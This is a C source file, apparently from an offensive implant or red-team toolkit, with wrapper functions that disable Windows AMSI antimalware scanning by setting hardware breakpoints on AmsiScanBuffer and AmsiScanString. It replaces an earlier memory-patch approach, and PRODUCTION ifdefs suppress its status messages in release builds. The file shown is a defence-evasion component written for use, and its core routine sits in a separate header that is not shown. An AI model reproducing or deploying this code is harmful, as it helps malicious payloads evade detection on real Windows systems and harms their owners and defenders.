#include "amsi_bypass.h"
#include "hwbp_bypass.h"

/*
 * AMSI bypass via HWBP (Dr1=AmsiScanBuffer, Dr2=AmsiScanString).
 * Replaces the old 0xC3 memory patch — no write to amsi.dll .text.
 */

BOOL PatchAmsiScanBuffer(void)
{
    hwbp_patch_amsi();
    return TRUE;
}

BOOL DisableAMSI(AMSI_RESULT *result)
{
#ifndef PRODUCTION
    printf("[*] AMSI bypass (HWBP)...\n");
#endif

    result->success = FALSE;
    result->amsiScanBufferPatched = FALSE;

    hwbp_patch_amsi();

    result->amsiScanBufferPatched = TRUE;
    result->success = TRUE;

    return TRUE;
}

void PrintAMSIResult(AMSI_RESULT *result)
{
#ifndef PRODUCTION
    if (result->success)
        printf("[+] AMSI disabled (HWBP on AmsiScanBuffer/String)\n");
    else
        printf("[-] AMSI bypass failed\n");
#endif
}
